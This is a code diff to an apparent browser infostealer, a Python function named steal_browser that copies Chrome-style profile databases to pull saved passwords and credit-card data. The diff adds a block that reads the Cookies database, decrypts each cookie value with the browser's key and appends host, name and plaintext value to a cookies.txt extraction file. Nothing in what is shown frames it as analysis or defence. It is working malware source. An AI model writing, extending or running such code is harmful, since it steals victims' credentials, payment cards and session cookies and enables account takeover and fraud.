@@ -175,11 +175,13 @@ def steal_browser():
     for name, path in BROWSERS.items():
         if not os.path.exists(path): continue
         key = get_key(path)
+        if not key: continue
+
         for prof in os.listdir(path):
             if not ("Default" in prof or "Profile" in prof): continue
             p = os.path.join(path, prof)
 
-            # === Passwords ===
+            # === PASSWORDS ===
             db = os.path.join(p, "Login Data")
             if os.path.exists(db):
                 shutil.copy2(db, "tmp_pwd.db")
@@ -193,7 +195,7 @@ def steal_browser():
                 c.connection.close()
                 os.remove("tmp_pwd.db")
 
-            # === Credit Cards ===
+            # === CARDS ===
             card_db = os.path.join(p, "Web Data")
             if os.path.exists(card_db):
                 shutil.copy2(card_db, "tmp_card.db")
@@ -209,6 +211,23 @@ def steal_browser():
                 except: pass
                 conn.close()
                 os.remove("tmp_card.db")
+
+            # === COOKIES ===
+            cookie_db = os.path.join(p, "Cookies")
+            if os.path.exists(cookie_db):
+                shutil.copy2(cookie_db, "tmp_cookie.db")
+                conn = sqlite3.connect("tmp_cookie.db")
+                try:
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                    with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8") as f:
+                        for host, name_, enc_val in cursor.fetchall():
+                            decrypted = decrypt(enc_val, key)
+                            f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
+                except: pass
+                conn.close()
+                os.remove("tmp_cookie.db")
+
 
 
 # === FIREFOX PASSWORD DECRYPTION ===
